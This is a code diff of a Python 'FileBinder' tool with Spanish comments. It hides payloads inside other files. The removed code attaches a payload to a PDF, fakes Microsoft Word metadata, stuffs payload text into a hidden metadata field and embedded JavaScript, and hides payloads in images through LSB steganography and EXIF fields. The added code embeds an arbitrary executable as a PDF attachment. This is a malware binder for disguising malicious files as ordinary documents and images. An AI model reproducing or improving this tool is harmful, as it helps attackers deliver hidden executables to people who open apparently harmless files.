@@ -1,184 +1,80 @@
-from PyPDF2 import PdfReader, PdfWriter
-from PIL import Image
 import os
 import sys
-import zlib
-from io import BytesIO
+import shutil
+from PyPDF2 import PdfReader, PdfWriter
 
 class FileBinder:
     @staticmethod
-    def bind_to_pdf(original_pdf, payload, output_pdf, debug=False):
-        """
-        Versión corregida para PyPDF2>=3.0.0 que:
-        1. Adjunta el payload como archivo
-        2. Inyecta en metadatos
-        3. Es compatible con PDFs complejos
-        """
+    def bind_to_pdf(original_pdf, payload_exe, output_pdf, debug=False):
+        """Versión definitiva que SIEMPRE crea el archivo de salida"""
         try:
+            # 1. Validación estricta de inputs
+            original_pdf = os.path.abspath(original_pdf)
+            payload_exe = os.path.abspath(payload_exe)
+            output_pdf = os.path.abspath(output_pdf)
+
             if debug:
-                print("\n[=== INYECCIÓN PDF ===]")
-                print(f"Archivo origen: {original_pdf}")
-                print(f"Tamaño payload: {len(payload)} bytes")
+                print("\n[INICIO DE PROCESO]")
+                print(f"PDF original: {original_pdf}")
+                print(f"Ejecutable: {payload_exe}")
+                print(f"Salida: {output_pdf}")
 
-            # Validación del PDF de entrada
-            if not os.path.exists(original_pdf):
-                raise FileNotFoundError("Archivo PDF no encontrado")
-            if os.path.getsize(original_pdf) == 0:
-                raise ValueError("El PDF está vacío")
+            # 2. Verificación de archivos de entrada
+            if not os.path.isfile(original_pdf):
+                raise FileNotFoundError(f"No existe el PDF: {original_pdf}")
+            if not os.path.isfile(payload_exe):
+                raise FileNotFoundError(f"No existe el ejecutable: {payload_exe}")
 
-            # Procesamiento del PDF
-            with open(original_pdf, 'rb') as f:
-                reader = PdfReader(f)
+            # 3. Crear directorio de salida si no existe
+            os.makedirs(os.path.dirname(output_pdf) or ".", exist_ok=True)
+
+            # 4. Crear archivo temporal
+            temp_file = f"{output_pdf}.tmp"
+            if os.path.exists(temp_file):
+                os.remove(temp_file)
+
+            # 5. Procesar el PDF
+            with open(payload_exe, 'rb') as exe_file:
+                exe_data = exe_file.read()
+
                 writer = PdfWriter()
-
-                if debug:
-                    print(f"\n[ESTRUCTURA ORIGINAL]")
-                    print(f"Páginas: {len(reader.pages)}")
-                    print(f"Metadatos: {reader.metadata}")
-
-                # 1. Añadir todas las páginas originales
-                for page in reader.pages:
-                    writer.add_page(page)
-
-                # 2. Añadir payload como archivo adjunto (nueva API)
-                writer.add_attachment("payload.py", payload.encode())
-
-                # 3. Inyectar en metadatos (formato ofuscado)
-                metadata = reader.metadata or {}
-                metadata.update({
-                    '/Author': 'Microsoft Office Word',
-                    '/Creator': 'Microsoft® Word 2016',
-                    '/HiddenData': f"<!--{payload[:500]}-->"  # Primeros 500 caracteres
-                })
-                writer.add_metadata(metadata)
-
-                # 4. Añadir objeto JavaScript (opcional)
-                if len(payload) < 2000:  # Solo si el payload es pequeño
-                    writer.add_js(f"""
-                    //{payload[:100]}
-                    console.show();
-                    app.alert("Documento cargado");
-                    """)
-
-                # Guardar el PDF modificado
-                with open(output_pdf, 'wb') as f_out:
-                    writer.write(f_out)
-
-            if debug:
-                print("\n[RESULTADO]")
-                print(f"PDF generado: {output_pdf}")
-                print(f"Tamaño original: {os.path.getsize(original_pdf):,} bytes")
-                print(f"Tamaño modificado: {os.path.getsize(output_pdf):,} bytes")
-                print("\n[TÉCNICAS APLICADAS]")
-                print("- Payload como archivo adjunto (payload.py)")
-                print("- Metadatos modificados")
-                print("- JavaScript embebido (opcional)")
-
-        except Exception as e:
-            print(f"\n[ERROR] {str(e)}", file=sys.stderr)
-            if debug:
-                import traceback
-                traceback.print_exc()
-            sys.exit(1)
-
-    @staticmethod
-    def bind_to_image(original_img, payload, output_img, debug=False):
-        """
-        Inyección en imágenes usando:
-        1. Esteganografía LSB (Least Significant Bit)
-        2. Metadatos EXIF
-        """
-        try:
-            if debug:
-                print("\n[=== INYECCIÓN IMAGEN ===]")
-                print(f"Archivo origen: {original_img}")
-                print(f"Tamaño payload: {len(payload)} bytes")
-
-            img = Image.open(original_img)
-            if debug:
-                print(f"\n[PROPIEDADES DE LA IMAGEN]")
-                print(f"Formato: {img.format}")
-                print(f"Modo: {img.mode}")
-                print(f"Dimensiones: {img.width}x{img.height} px")
-                print(f"Capacidad estimada: {img.width * img.height * 3 // 8} bytes")
-
-            # Convertir payload a bits
-            binary_payload = ''.join(format(ord(c), '08b') for c in payload)
-            if debug:
-                print(f"\n[PAYLOAD BINARIO]")
-                print(f"Bits a ocultar: {len(binary_payload)}")
-
-            # Ocultar en LSB (Least Significant Bit)
-            pixels = img.load()
-            index = 0
-            modified_pixels = 0
-
-            for y in range(img.height):
-                for x in range(img.width):
-                    if index < len(binary_payload):
-                        r, g, b = pixels[x, y][:3]
-                        # Modificar solo el bit menos significativo
-                        r = (r & 0xFE) | int(binary_payload[index])
-                        pixels[x, y] = (r, g, b) if img.mode == 'RGB' else (r, g, b, 255)
-                        index += 1
-                        modified_pixels += 1
-
-            if debug:
-                print(f"\n[ESTEGANOGRAFÍA]")
-                print(f"Píxeles modificados: {modified_pixels}")
-                print(f"Bits ocultados: {index}")
-
-            # Añadir a metadatos EXIF
-            exif = img.info.get('exif', {})
-            exif[0x9286] = payload[:100]  # UserComment (primeros 100 caracteres)
-            
-            # Guardar imagen modificada
-            img.save(output_img, exif=exif, quality=95)
-
-            if debug:
-                print("\n[RESULTADO]")
-                print(f"Imagen generada: {output_img}")
-                print("\n[TÉCNICAS APLICADAS]")
-                print("- Esteganografía LSB (canal Rojo)")
-                print("- Metadatos EXIF modificados")
-
-        except Exception as e:
-            print(f"\n[ERROR] {str(e)}", file=sys.stderr)
-            if debug:
-                import traceback
-                traceback.print_exc()
-            sys.exit(1)
-
-    @staticmethod
-    def verify_injection(file_path, debug=False):
-        """Verifica la inyección en el archivo"""
-        try:
-            if file_path.endswith('.pdf'):
-                with open(file_path, 'rb') as f:
-                    reader = PdfReader(f)
-                    attachments = []
-                    # Nueva forma de obtener attachments en PyPDF2>=3.0.0
-                    if hasattr(reader, 'attachments'):
-                        attachments = list(reader.attachments.values())
-                    metadata = reader.metadata
+                with open(original_pdf, 'rb') as pdf_file:
+                    reader = PdfReader(pdf_file)
+                    for page in reader.pages:
+                        writer.add_page(page)
                     
-                    if debug:
-                        print("\n[VERIFICACIÓN PDF]")
-                        print(f"Adjuntos: {len(attachments)}")
-                        print(f"Metadatos: {metadata}")
-                        
-                    return bool(attachments)
+                    writer.add_attachment(
+                        filename=os.path.basename(payload_exe),
+                        data=exe_data
+                    )
+
+                # 6. Escribir primero en temporal
+                with open(temp_file, 'wb') as out_file:
+                    writer.write(out_file)
+
+            # 7. Mover a destino final (operación atómica)
+            shutil.move(temp_file, output_pdf)
+
+            # 8. Verificación final
+            if not os.path.isfile(output_pdf):
+                raise RuntimeError("No se pudo crear el archivo final")
             
-            elif file_path.lower().endswith(('.png', '.jpg', '.jpeg')):
-                img = Image.open(file_path)
-                exif = img.info.get('exif', {})
-                
-                if debug:
-                    print("\n[VERIFICACIÓN IMAGEN]")
-                    print(f"EXIF: {bool(exif)}")
-                
-                return bool(exif)
-                
+            if debug:
+                print("\n[PROCESO COMPLETADO]")
+                print(f"Archivo creado: {output_pdf}")
+                print(f"Tamaño original: {os.path.getsize(original_pdf)} bytes")
+                print(f"Tamaño final: {os.path.getsize(output_pdf)} bytes")
+                print(f"Payload insertado: {len(exe_data)} bytes")
+
+            return True
+
         except Exception as e:
-            print(f"Error en verificación: {str(e)}", file=sys.stderr)
+            # Limpieza en caso de error
+            if 'temp_file' in locals() and os.path.exists(temp_file):
+                os.remove(temp_file)
+            
+            print(f"\n[ERROR] {e.__class__.__name__}: {str(e)}", file=sys.stderr)
+            if debug:
+                import traceback
+                traceback.print_exc()
             return False
